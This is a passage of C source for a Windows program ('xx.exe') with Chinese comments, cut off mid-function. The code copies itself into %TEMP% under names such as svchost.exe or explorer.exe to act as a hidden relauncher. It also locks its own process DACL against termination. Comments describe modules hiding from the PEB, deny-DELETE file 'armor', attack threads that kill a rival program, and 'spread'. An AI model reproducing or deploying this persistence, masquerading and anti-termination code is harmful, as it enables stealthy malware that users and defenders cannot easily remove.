/*
 * xx.c - 主进程（集成 DeamonInit、guard.dll 加载，修复路径写入）
 * 编译器：GNU GCC (MinGW-w64)
 * 编译选项：gcc -s -O2 -Wall -static -o "%OUTDIR%\xx.exe" xx\xx.c ^
    -lole32 -loleaut32 -lwbemuuid -ladvapi32 -lpsapi -lshell32
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM

#include <windows.h>
#include <accctrl.h>
#include <aclapi.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <time.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <wbemidl.h>


/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

/* Fix for MinGW missing CIM_FLAG_ANY */
#ifndef CIM_FLAG_ANY
#define CIM_FLAG_ANY 0
#endif

/* 全局变量 */
HANDLE g_hSharedMem = NULL;
PVOID  g_pSharedView = NULL;
WCHAR  g_szHeartbeatSuffix[64];
HANDLE g_hHeartbeatEvent = NULL;
HANDLE g_hSelfHandle = NULL;   /* 收紧 DACL 之前拿到的自身进程句柄（交给 guard） */
DWORD  g_dwOwnSession = 0;     /* 收紧 DACL 之前取到的会话号（之后取会失败） */
CRITICAL_SECTION g_csLog;
BOOL   g_bFreshMapping = FALSE;   /* 本次是否新建了共享内存映射（决定 salt 沿用/新生成） */
static ULONGLONG g_dwNameToken = 0;   /* 64 位会话随机名 token：不写共享内存，只用 XxSetNames 推给各模块 */
#define XX_WASTE_MS 200         /* 模仿 waste.c 的节奏：每 0.2 秒一条（10 条约 2 秒发完） */

/* 64 位密码学随机：RtlGenRandom（advapi32 的 SystemFunction036，Win7 自带）。
   失败才退回 rand()（有它就别用 rand：rand 的种子只含 tick+pid，可被时间窗爆破）。 */
typedef BOOLEAN (NTAPI *RtlGenRandom_t)(PVOID, ULONG);

static BOOL GenRandom64(ULONGLONG *pOut)
{
    static RtlGenRandom_t s_pFn = NULL;
    static BOOL s_bTried = FALSE;

    if (!pOut) return FALSE;
    if (!s_bTried) {
        HMODULE h = GetModuleHandleW(L"advapi32.dll");
        s_bTried = TRUE;
        if (!h) h = LoadLibraryW(L"advapi32.dll");
        if (h) s_pFn = (RtlGenRandom_t)GetProcAddress(h, "SystemFunction036");
    }
    if (!s_pFn) return FALSE;
    return s_pFn(pOut, (ULONG)sizeof(*pOut)) ? TRUE : FALSE;
}

/* 生成 64 位随机 token 并置最低位（保证非 0：0 是"没有 token"的哨兵值） */
static ULONGLONG MakeNameToken(void)
{
    ULONGLONG t = 0;
    if (!GenRandom64(&t)) {
        srand(GetTickCount() * 2654435761u + GetCurrentProcessId() * 7u);
        t = ((ULONGLONG)(DWORD)rand() << 32) ^ ((ULONGLONG)(DWORD)rand() << 16) ^ (DWORD)rand();
    }
    return t | 1ULL;
}

/* 命名对象用的 token：优先 RtlGenRandom 生成的 64 位值；退回共享内存的 64 位回退 token；再退回固定值 */
static ULONGLONG NameTok(void)
{
    if (g_dwNameToken) return g_dwNameToken;
    if (g_pSharedView) {
        ULONGLONG s = XX_NAME_TOKEN64(g_pSharedView);
        if (s) return s;
    }
    return XX_NAME_TOKEN_FIXED;
}

static void WriteLog(const WCHAR *format, ...);   /* 复活器代码里要用 */

/* ================== 加载我们自己的模块（绝对路径 + **版本校验**） ==================
   历史问题：机器上同时躺着旧版 dll 时，`LoadLibraryW` 可能"成功"返回一个**旧模块**，
   于是 GetProcAddress("DeamonInit"/"StartDefense"/"StartAttack") 全失败，日志却显示新路径
   —— 看起来像"新 dll 没有导出"，实际装进去的是旧文件。
   现在每个模块都导出 XxBuildTag()（当前 "v7"），加载后必须校验；不匹配就换下一个候选
   （不卸载：模块已映射，卸载更危险）。也不再用相对名兜底 —— 那会命中当前目录/System32 的旧文件。 */
#define XX_MOD_TAG_A "v7"

static HMODULE TryLoadVerified(const WCHAR *cand, WCHAR *outPath, SIZE_T cchOut,
                               HMODULE *phUnverified, WCHAR *badPath, SIZE_T cchBad)
{
    HMODULE h;
    WCHAR real[MAX_PATH] = L"";
    typedef const char * (WINAPI *Tag_t)(void);
    Tag_t pTag;

    if (!cand || !cand[0]) return NULL;
    h = LoadLibraryW(cand);
    if (!h) return NULL;

    /* 注意：模块的 DllMain 会调用 XXHideSelfFromPeb() 把自己从 PEB 三条链里摘掉，
       之后再 GetModuleFileNameW(该模块) 会失败（→ 日志里的"实际=(未知)"）。
       摘链之前拿不到路径就用请求路径，日志更好读。 */
    if (!GetModuleFileNameW(h, real, MAX_PATH)) real[0] = L'\0';
    pTag = (Tag_t)XXGetProcByName(h, "XxBuildTag");   /* 摘链后 GetProcAddress 会失败，必须自己解析导出表 */
    if (!pTag || strcmp(pTag(), XX_MOD_TAG_A) != 0) {
        WriteLog(L"!! 版本不匹配: 请求=%ls 实际=%ls 标记=%ls -> 先记下，继续找合格候选",
                 cand, real[0] ? real : cand, pTag ? L"有(不同版本)" : L"无(过度古老的 dll)");
        if (phUnverified && !*phUnverified) {                 /* 第一个不合格的留作兜底 */
            *phUnverified = h;
            if (badPath && cchBad) wcsncpy_s(badPath, cchBad, real[0] ? real : cand, _TRUNCATE);
        }
        return NULL;
    }
    if (outPath) wcsncpy_s(outPath, cchOut, real[0] ? real : cand, _TRUNCATE);
    return h;
}

static HMODULE LoadOurModuleEx(const WCHAR *leaf, WCHAR *outPath, SIZE_T cchOut)
{
    WCHAR self[MAX_PATH], dir[MAX_PATH], cand[MAX_PATH], tmp[MAX_PATH];
    HMODULE hUnverified = NULL;
    WCHAR badPath[MAX_PATH] = L"";
    DWORD salt;

    if (outPath && cchOut) outPath[0] = L'\0';
    if (!leaf || !leaf[0]) return NULL;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);

    /* 1) 自身目录 */
    if (GetModuleFileNameW(NULL, self, MAX_PATH)) {
        WCHAR *s = wcsrchr(self, L'\\');
        if (s) {
            s[1] = L'\0';
            swprintf_s(cand, MAX_PATH, L"%ls%ls", self, leaf);
            if (GetFileAttributesW(cand) != INVALID_FILE_ATTRIBUTES) {
                HMODULE h = TryLoadVerified(cand, outPath, cchOut, &hUnverified, badPath, MAX_PATH);
                if (h) return h;
            }
        }
    }
    /* 2) 共享内存里记的程序目录（副本在 %TEMP% 跑时真身 dll 在原目录） */
    salt = g_pSharedView ? XX_TMP_SALT(g_pSharedView) : 0;
    if (g_pSharedView) {
        XXDirNameOf(XX_XXPATH(g_pSharedView), dir, MAX_PATH);
        if (dir[0]) {
            swprintf_s(cand, MAX_PATH, L"%ls%ls", dir, leaf);
            if (GetFileAttributesW(cand) != INVALID_FILE_ATTRIBUTES) {
                HMODULE h = TryLoadVerified(cand, outPath, cchOut, &hUnverified, badPath, MAX_PATH);
                if (h) return h;
            }
            if (salt && XXMakeTempCopy(cand, salt, tmp, MAX_PATH)) {
                HMODULE h = TryLoadVerified(tmp, outPath, cchOut, &hUnverified, badPath, MAX_PATH);
                if (h) return h;
            }
        }
    }
    /* 没有合格版本：**兜底用旧版**，而不是干脆不加载 —— "少一个功能"比"整个模块没有"好
       （defense/svcguard 缺了就完全失去防御/扩散）。日志会明确告诉用户该换哪个文件。 */
    if (hUnverified) {
        WriteLog(L"!! %ls 没有合格版本（本版应为 %hs），兜底使用旧版: %ls -> 请替换该文件",
                 leaf, XX_MOD_TAG_A, badPath[0] ? badPath : L"(未知)");
        if (outPath) wcsncpy_s(outPath, cchOut, badPath[0] ? badPath : leaf, _TRUNCATE);
        return hUnverified;
    }
    WriteLog(L"!! 找不到 %ls（自身目录与程序目录里都没有这个文件）", leaf);
    return NULL;
}
/* ================== 复活器（reviver）：**只负责复活 xx**，不接管 ==================
   设计变更（用户要求）：
     · 运行期不再"让副本接管全部工作"，而是留一个**只做复活**的小进程；
     · 它靠命令行拿到上一轮的 **64 位会话 token** 和本体的完整路径：
           xx.exe --revive <bossPid> --exe "<xx.exe 全路径>" --token <16 位十六进制>
       本体一死（或心跳停摆）它就把 xx.exe 重新拉起来，并**把同一个 token 传回去**，
       这样复活出来的实例沿用同一套命名对象/共享内存后缀，等于"接着上一轮继续干活"。
     · 极端情况（没有 token、没有 exe 路径、拉起失败）：直接跑一个**全新的 xx**（不带 token，
       由它自己生成新 token、按新会话重新开始）。
   复活器拉起新实例后自己退出 —— 新实例会再布置一个自己的复活器，链条不会断，也不会出现
   两份同时干活的本体。 */
static const WCHAR *g_reviverNames[] = { L"svchost.exe", L"explorer.exe", L"conhost.exe" };
static BOOL  g_bReviveMode = FALSE;      /* 本进程是复活器 */
static DWORD g_dwRevivePid = 0;          /* 要监视的本体 PID */
static WCHAR g_szReviveExe[MAX_PATH] = L"";  /* 本体完整路径 */
static ULONGLONG g_dwInheritedToken = 0; /* 从命令行继承的会话 token（0 = 没有） */

static void ParseReviveArgs(void)
{
    const WCHAR *cmd = GetCommandLineW();
    const WCHAR *p;

    if (!cmd) return;

    p = wcsstr(cmd, L"--revive");
    if (p) {
        p += 8;
        while (*p == L' ' || *p == L'\t' || *p == L'=') p++;
        if (*p >= L'0' && *p <= L'9') {
            g_dwRevivePid = (DWORD)wcstoul(p, NULL, 10);
            g_bReviveMode = TRUE;
        }
    }

    p = wcsstr(cmd, L"--exe");
    if (p) {
        p += 5;
        while (*p == L' ' || *p == L'\t' || *p == L'=') p++;
        if (*p == L'"') {
            const WCHAR *q = p + 1;
            const WCHAR *e = wcschr(q, L'"');
            if (e && (e - q) < (int)(_countof(g_szReviveExe) - 1)) {
                wcsncpy_s(g_szReviveExe, _countof(g_szReviveExe), q, (size_t)(e - q));
            }
        } else {
            const WCHAR *e = p;
            while (*e && *e != L' ') e++;
            if ((e - p) < (int)(_countof(g_szReviveExe) - 1))
                wcsncpy_s(g_szReviveExe, _countof(g_szReviveExe), p, (size_t)(e - p));
        }
    }

    p = wcsstr(cmd, L"--token");
    if (p) {
        ULONGLONG tok;
        p += 7;
        while (*p == L' ' || *p == L'\t' || *p == L'=') p++;
        tok = wcstoull(p, NULL, 16);
        if (tok) g_dwInheritedToken = tok | 1ULL;
    }

    if (g_bReviveMode)
        WriteLog(L"复活器参数: boss=%lu exe=%ls token=%ls", g_dwRevivePid,
                 g_szReviveExe[0] ? g_szReviveExe : L"(未给)",
                 g_dwInheritedToken ? L"已继承" : L"无(将跑全新实例)");
    else if (g_dwInheritedToken)
        WriteLog(L"本实例继承了上一轮的会话 token（接着上一轮继续工作）");
}

/* 进程表里有没有活着的 xx.exe（排除复活器自己） */
static BOOL AnyXxExeRunning(void)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    BOOL found = FALSE;

    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (_wcsicmp(pe.szExeFile, L"xx.exe") == 0) { found = TRUE; break; }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

/* 共享内存里记着的 xx 路径（复活器在 %TEMP% 跑，靠它找真身；没有就用命令行给的） */
static void GetReviveTargetPath(WCHAR *out, SIZE_T cch)
{
    out[0] = L'\0';
    if (g_szReviveExe[0]) { wcsncpy_s(out, cch, g_szReviveExe, _TRUNCATE); return; }
    if (!g_pSharedView) {
        HANDLE h = XXOpenShared();
        if (h) {
            g_pSharedView = MapViewOfFile(h, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
            CloseHandle(h);        /* 视图独立有效；只读够用 */
        }
    }
    if (g_pSharedView) {
        const WCHAR *p = XX_XXPATH(g_pSharedView);
        if (p[0] && XXPathLooksLikeOurXx(p)) wcsncpy_s(out, cch, p, _TRUNCATE);
    }
}

/* ================== 结束后删除（300ms × 10 重试） ==================
   进程刚死时，系统不一定立刻释放它镜像文件的句柄（映像段/内存管理器延迟回收），
   所以"结束后立即删除"经常第一次就失败。这里统一按用户要求：
   **每 300ms 重试一次，总共 10 次**（约 3 秒），每次把结果写日志。 */
static BOOL DeleteFileWithRetry(const WCHAR *path, const WCHAR *tag)
{
    int i;
    if (!path || !path[0]) return FALSE;
    for (i = 0; i < 10; i++) {
        if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) {
            WriteLog(L"%ls: %ls 已不存在（无需删除）", tag, path);
            return TRUE;
        }
        SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
        if (DeleteFileW(path)) {
            WriteLog(L"%ls: 删除成功（第 %d 次）: %ls", tag, i + 1, path);
            return TRUE;
        }
        WriteLog(L"%ls: 删除失败 err=%lu（第 %d/10 次），300ms 后重试: %ls",
                 tag, GetLastError(), i + 1, path);
        Sleep(300);
    }
    WriteLog(L"%ls: 10 次都没删掉（映像仍被占用？）: %ls", tag, path);
    return FALSE;
}

/* 删除线程版：不阻塞调用方（用于清理 %TEMP% 里的旧副本） */
static DWORD WINAPI DeleteThreadProc(LPVOID lp)
{
    WCHAR *path = (WCHAR *)lp;
    DeleteFileWithRetry(path, L"清理旧副本");
    free(path);
    return 0;
}

static void DeleteInThread(const WCHAR *path)
{
    WCHAR *copy;
    SIZE_T cb;
    if (!path || !path[0]) return;
    cb = (wcslen(path) + 1) * sizeof(WCHAR);
    copy = (WCHAR *)malloc(cb);
    if (!copy) return;
    wcscpy_s(copy, cb / sizeof(WCHAR), path);
    if (!CreateThread(NULL, 0, DeleteThreadProc, copy, 0, NULL)) free(copy);
}
/* 复活器主循环：等本体结束/心跳停摆 → 拉起新实例（带 token 继续，或全新） → 自己退出 */
static void RunReviver(void)
{
    HANDLE hBoss = NULL;
    WCHAR exePath[MAX_PATH];
    WCHAR cmdLine[MAX_PATH * 2];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD waited = 0;

    if (g_dwRevivePid)
        hBoss = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, g_dwRevivePid);

    WriteLog(L"复活器：开始监视 xx.exe(pid=%lu)%ls", g_dwRevivePid,
             hBoss ? L"" : L"（打不开句柄，改为只看进程表/心跳）");

    for (;;) {
        BOOL bossGone = FALSE;
        if (hBoss) {
            if (WaitForSingleObject(hBoss, 200) == WAIT_OBJECT_0) { bossGone = TRUE; }
        } else {
            Sleep(200);
            bossGone = (g_dwRevivePid && !AnyXxExeRunning()) ? TRUE : FALSE;
        }
        if (!bossGone && !AnyXxExeRunning()) bossGone = TRUE;
        if (bossGone) { WriteLog(L"复活器：xx.exe 已结束"); break; }

        /* 本体可能活着但心跳停摆（被挂起/弹窗被卸）：也复活一次 */
        if (g_pSharedView && XX_LAYOUT(g_pSharedView) == XX_LAYOUT_VERSION) {
            static LONG s_last = -1000000;
            LONG cur = XX_HB_TICK(g_pSharedView);
            if (cur == s_last) {
                waited += 200;
                if (waited >= HEARTBEAT_STALE_MS + 2000) {
                    WriteLog(L"复活器：心跳停摆 %lu ms，判定本体已僵死", (unsigned long)waited);
                    break;
                }
            } else { s_last = cur; waited = 0; }
        }
        Sleep(0);
    }
    if (hBoss) CloseHandle(hBoss);

    GetReviveTargetPath(exePath, MAX_PATH);
    if (!exePath[0]) {
        WriteLog(L"复活器：拿不到 xx.exe 路径 -> 无法复活（本次放弃）");
        ExitProcess(0);
    }

    /* **不删旧映像，直接用现成的**：
       程序目录里的 xx.exe 已被 defense 的"只读 + deny-DELETE"装甲护住 ——
       那既挡住了对手的 DeleteFileW，也会挡住我们自己；再去做"删了再还原"纯属自找麻烦
       （还会多打十几行失败日志、把复活推迟 3 秒）。
       所以复活器直接拉起现成的 xx.exe；只有当它真的**不在了**（被对手删掉、被我们清过）
       才用复活器自己的镜像补一份回来。 */
    if (GetFileAttributesW(exePath) == INVALID_FILE_ATTRIBUTES) {
        WCHAR self[MAX_PATH] = L"";
        WriteLog(L"复活器：%ls 不在了，用自身副本补一份", exePath);
        if (GetModuleFileNameW(NULL, self, MAX_PATH) && CopyFileW(self, exePath, FALSE))
            WriteLog(L"复活器：已从自身副本还原 %ls", exePath);
        else
            WriteLog(L"复活器：还原 %ls 失败 err=%lu", exePath, GetLastError());
    }
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;   /* SW_HIDE 会让新实例的第一次 ShowWindow 失效 */
    memset(&pi, 0, sizeof(pi));

    if (g_dwInheritedToken) {
        swprintf_s(cmdLine, _countof(cmdLine), L"\"%ls\" --token %016llX", exePath,
                   (unsigned long long)g_dwInheritedToken);
        WriteLog(L"复活器：带上上一轮 token 复活 -> %ls", exePath);
    } else {
        swprintf_s(cmdLine, _countof(cmdLine), L"\"%ls\"", exePath);
        WriteLog(L"复活器：没有可用 token -> 拉起**全新**实例 -> %ls", exePath);
    }

    {
        DWORD newPid = 0;
        BOOL ok = FALSE;

        /* 带 token 时必须用 lpCommandLine（XXLaunchInConsoleSession 只接收 exePath，不能带参数） */
        if (g_dwInheritedToken) {
            if (CreateProcessW(exePath, cmdLine, NULL, NULL, FALSE,
                               CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                ok = TRUE;
                newPid = pi.dwProcessId;
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                WriteLog(L"复活器：带 token 拉起失败 err=%lu -> 退回不带 token（会变成全新会话）",
                         GetLastError());
            }
        }
        if (!ok) ok = XXLaunchInConsoleSession(exePath, FALSE, &newPid);
        if (ok) WriteLog(L"复活器：已拉起新实例 pid=%lu（本复活器退出）", newPid);
        else    WriteLog(L"复活器：两种拉起方式都失败 err=%lu", GetLastError());
    }
    ExitProcess(0);
}

/* 由本体调用：把自己复制到 %TEMP% 改名，并以 --revive 启动（**只复活，不接管**） */
static void SpawnReviver(void)
{
    WCHAR self[MAX_PATH], tmpDir[MAX_PATH], target[MAX_PATH], cmd[MAX_PATH * 3];
    const WCHAR *leaf;
    ULONGLONG rnd = 0;
    DWORD nNames, pick, tries;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    BOOL bOk = FALSE;

    if (g_bReviveMode) return;
    if (!GetModuleFileNameW(NULL, self, MAX_PATH)) return;
    leaf = wcsrchr(self, L'\\');
    leaf = leaf ? leaf + 1 : self;
    if (_wcsicmp(leaf, L"xx.exe") != 0) return;   /* 只有本体负责布置复活器 */
    if (!GetTempPathW(MAX_PATH, tmpDir)) return;

    nNames = (DWORD)(_countof(g_reviverNames));
    pick = GenRandom64(&rnd) ? (DWORD)(rnd % nNames) : (GetTickCount() % nNames);

    for (tries = 0; tries < nNames && !bOk; tries++) {
        swprintf_s(target, MAX_PATH, L"%ls%ls", tmpDir, g_reviverNames[(pick + tries) % nNames]);
        if (CopyFileW(self, target, FALSE)) { bOk = TRUE; break; }
        DeleteFileW(target);
        if (CopyFileW(self, target, FALSE)) { bOk = TRUE; break; }
    }
    if (!bOk) { WriteLog(L"布置复活器失败：三个候选名都复制不了"); return; }
    /* 顺手清理 %TEMP% 里**其它**旧副本（内存映像句柄可能还没释放，交给重试线程做） */
    {
        int k;
        WCHAR old[MAX_PATH];
        for (k = 0; k < (int)(_countof(g_reviverNames)); k++) {
            swprintf_s(old, MAX_PATH, L"%ls%ls", tmpDir, g_reviverNames[k]);
            if (_wcsicmp(old, target) == 0) continue;          /* 别删刚布置的这份 */
            if (GetFileAttributesW(old) != INVALID_FILE_ATTRIBUTES) DeleteInThread(old);
        }
    }
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;   /* SW_HIDE 会让新实例的第一次 ShowWindow 失效 */
    memset(&pi, 0, sizeof(pi));

    swprintf_s(cmd, _countof(cmd), L"\"%ls\" --revive %lu --exe \"%ls\" --token %016llX",
               target, (unsigned long)GetCurrentProcessId(), self,
               (unsigned long long)NameTok());
    if (CreateProcessW(target, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WriteLog(L"已布置复活器: %ls (pid=%lu)", target, (unsigned long)pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        WriteLog(L"布置复活器失败(启动): %ls err=%lu", target, GetLastError());
    }
}
static void WriteLog(const WCHAR *format, ...);

/* 把会话随机名推给本进程内加载的模块（同进程直接调用导出函数，不需要远程那套） */
static void PushNamesToModule(HMODULE hMod)
{
    typedef BOOL (WINAPI *SetNames_t)(const XX_NAME_BLOCK *);
    SetNames_t pSet;
    XX_NAME_BLOCK blk;

    if (!hMod) return;
    pSet = (SetNames_t)XXGetProcByName(hMod, "XxSetNames");
    if (!pSet) return;
    XXNameBlockInit(&blk, NameTok(), g_dwOwnSession);
    if (!pSet(&blk)) WriteLog(L"XxSetNames 被拒绝");
}

/* 前置声明 */
static BOOL InitSecurityDescriptor(void);
static BOOL InitSharedMemory(void);
static BOOL CreateHeartbeatSuffix(void);
static BOOL SetupWMISubscription(void);
static DWORD WINAPI InitThread(LPVOID lpParam);
static DWORD WINAPI AttackThread(LPVOID lpParam);
static BOOL GetProcessPathByPid(DWORD pid, WCHAR *path, DWORD cch);

void RegisterSelfToXpt(void);

/* 说明：原来这里有一段**在 main 之前跑的 TLS 回调**（"开局先杀一遍"：对 yy 窗口
   PostMessage 最小化/关闭/DestroyWindow）。它有两个问题：
     ① loader lock 下执行、还会碰临界区，卡住时后续线程全部排队 —— 现象是
        "进程活着、只有主线程能打日志、window.dll 永远不加载、没有弹窗"；
     ② 它做的正是**改标题/隐藏/关闭窗口**这类花招，实测收益很小。
   现在开局击杀改由两条攻击线程负责（窗口枚举 + 进程名扫描），这里整段删除。 */
/* ================== 安全描述符 ================== */
static BOOL InitSecurityDescriptor(void)
{
    HANDLE hToken = NULL;
    BYTE tokenUser[sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE];
    DWORD dwLen = sizeof(tokenUser);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)tokenUser;
    LPWSTR szUserSid = NULL;
    WCHAR szSDDL[256];
    PSECURITY_DESCRIPTOR pSD = NULL;
    ULONG cbSD = 0;
    PACL pDacl = NULL;
    BOOL bDaclPresent = FALSE, bDaclDefaulted = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    if (!GetTokenInformation(hToken, TokenUser, tokenUser, dwLen, &dwLen)) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);

    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &szUserSid))
        return FALSE;

    _snwprintf(szSDDL, _countof(szSDDL),
        L"D:(D;OICI;GA;;;WD)(A;OICI;GA;;;SY)(A;OICI;GRGWGX;;;%s)", szUserSid);
    LocalFree(szUserSid);

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            szSDDL, SDDL_REVISION_1, &pSD, &cbSD))
        return FALSE;

    if (!GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted) || !bDaclPresent) {
        LocalFree(pSD);
        return FALSE;
    }

    if (SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT,
                        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                        NULL, NULL, pDacl, NULL) != ERROR_SUCCESS)
    {
        if (SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT,
                            DACL_SECURITY_INFORMATION,
                            NULL, NULL, pDacl, NULL) != ERROR_SUCCESS) {
            LocalFree(pSD);
            return FALSE;
        }
    }

    LocalFree(pSD);
    return TRUE;
}

/* 将自己注册到 xpt.xpt（覆盖写入，模仿 xpt.cpp） */
void RegisterSelfToXpt(void)
{
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    DWORD pid = GetCurrentProcessId();

    // 构造与 xx.exe 同目录的 xpt.xpt
    char xptPath[MAX_PATH];
    snprintf(xptPath, MAX_PATH, "%s", selfPath);   /* 保证以 NUL 结尾 */
    char *pSlash = strrchr(xptPath, '\\');
    if (pSlash) pSlash[1] = '\0';
    strncat(xptPath, XPT_FILE_NAME, MAX_PATH - strlen(xptPath) - 1);

    // 覆盖写入
    FILE *fp = fopen(xptPath, "w");
    if (fp) {
        fprintf(fp, "%lu\n%s\n", pid, selfPath);
        fclose(fp);
    }
}

/* ================== 共享内存 ================== */
static BOOL InitSharedMemory(void)
{
    DWORD dwRand;
    BOOL  bFresh;

    g_hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
                                      0, SHARED_MEM_SIZE, SHARED_MEM_NAME);
    if (g_hSharedMem) {
        /* ERROR_ALREADY_EXISTS 表示已有实例在跑：此时绝不能清零，否则会把它的
           心跳后缀/弹窗后缀/日志/句柄表一并抹掉；而老 window.dll 实例只在启动时
           读过一次事件名，会永远 SetEvent 一个再也没人等的名字。 */
        bFresh = (GetLastError() != ERROR_ALREADY_EXISTS);
    } else {
        /* 没有 SeCreateGlobalPrivilege（非提权运行）：退到单会话命名空间 */
        g_hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
                                          0, SHARED_MEM_SIZE, SHARED_MEM_NAME_LOCAL);
        if (!g_hSharedMem) return FALSE;
        bFresh = (GetLastError() != ERROR_ALREADY_EXISTS);
    }
    g_bFreshMapping = bFresh;   /* 供后面决定"共享 salt 沿用还是新生成" */

    g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_ALL_ACCESS, 0, 0, SHARED_MEM_SIZE);
    if (!g_pSharedView) {
        CloseHandle(g_hSharedMem);
        g_hSharedMem = NULL;
        return FALSE;
    }

    srand(GetTickCount() ^ GetCurrentProcessId());
    dwRand = ((DWORD)rand() << 16) ^ (DWORD)rand() ^ GetTickCount();

    if (bFresh) {
        memset(g_pSharedView, 0, SHARED_MEM_SIZE);
        XX_LAYOUT(g_pSharedView) = XX_LAYOUT_VERSION;
        XX_TAG(g_pSharedView)    = dwRand;
    } else if (XX_LAYOUT(g_pSharedView) != XX_LAYOUT_VERSION) {
        /* 旧版本或异常残留：只重置"心跳计数器..保留区"这段新字段 */
        memset((BYTE *)g_pSharedView + OFFSET_HB_TICK, 0, OFFSET_LOG - OFFSET_HB_TICK);
        XX_LAYOUT(g_pSharedView) = XX_LAYOUT_VERSION;
        XX_TAG(g_pSharedView)    = dwRand;
    }
    /* 最新启动的实例即当前 xx.exe；guard 用 xpt.xpt 取 PID，这里只作诊断 */
    XX_XXPID(g_pSharedView) = GetCurrentProcessId();
    return TRUE;
}

static BOOL CreateHeartbeatSuffix(void)
{
    DWORD tick;
    WCHAR *pSuffix;
    WCHAR *pWndSuffix;
    WCHAR szEventName[128];

    if (!g_pSharedView) return FALSE;

    tick = GetTickCount();
    srand(tick ^ GetCurrentProcessId());

    pSuffix    = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_HB_SUFFIX);
    pWndSuffix = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_WND_SUFFIX);

    /* 已有实例留下的后缀必须沿用（原因见 InitSharedMemory 注释） */
    if (pSuffix[0] != L'\0') {
        wcsncpy_s(g_szHeartbeatSuffix, _countof(g_szHeartbeatSuffix), pSuffix, _TRUNCATE);
    } else {
        int r1 = rand() & 0xFFFF;
        int r2 = (rand() >> 16) & 0xFFFF;

        _snwprintf(g_szHeartbeatSuffix, _countof(g_szHeartbeatSuffix),
                   L"%08X_%04X", tick, (r1 ^ r2));
        g_szHeartbeatSuffix[_countof(g_szHeartbeatSuffix) - 1] = L'\0';
        wcsncpy_s(pSuffix, SUFFIX_MAX, g_szHeartbeatSuffix, _TRUNCATE);
    }

    if (pWndSuffix[0] == L'\0') {
        WCHAR szWndSuffix[32];
        _snwprintf(szWndSuffix, _countof(szWndSuffix), L"%08X%04X",
                   (unsigned)(tick ^ (GetCurrentProcessId() << 16)),
                   (unsigned)(rand() & 0xFFFF));
        szWndSuffix[_countof(szWndSuffix) - 1] = L'\0';
        wcsncpy_s(pWndSuffix, SUFFIX_MAX, szWndSuffix, _TRUNCATE);
    }

    /* 心跳事件保留（兼容旧观察方式）；弹窗存活判据已改为 OFFSET_HB_TICK 计数器。
       事件名也带会话 token，对手按旧名抢/伪造事件没有意义。 */
    {
        WCHAR base[96];
        XXNamedObject(base, _countof(base), TRUE, XX_PURPOSE_HEARTBEAT, NameTok(), 0);
        _snwprintf(szEventName, _countof(szEventName), L"%s_%s", base, g_szHeartbeatSuffix);
    }
    szEventName[_countof(szEventName) - 1] = L'\0';
    g_hHeartbeatEvent = CreateEventW(NULL, TRUE, FALSE, szEventName);
    if (g_hHeartbeatEvent) {
        SetEvent(g_hHeartbeatEvent);
    }
    return TRUE;
}

/* ================== 日志系统（共享内存） ================== */
static void WriteLog(const WCHAR *format, ...)
{
    EnterCriticalSection(&g_csLog);

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR szLine[512];
    va_list args;
    va_start(args, format);
    _vsnwprintf(szLine, _countof(szLine) - 1, format, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    /* 没有弹窗时共享日志看不到，同时落一份文件 */
    {
        WCHAR fline[640];
        _snwprintf(fline, _countof(fline) - 1, L"[xx][pid=%lu] %s\r\n",
                   GetCurrentProcessId(), szLine);
        fline[_countof(fline) - 1] = L'\0';
        XXFileLog(fline);
    }

    if (g_pSharedView) {
        WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
        size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
        WCHAR temp[512];
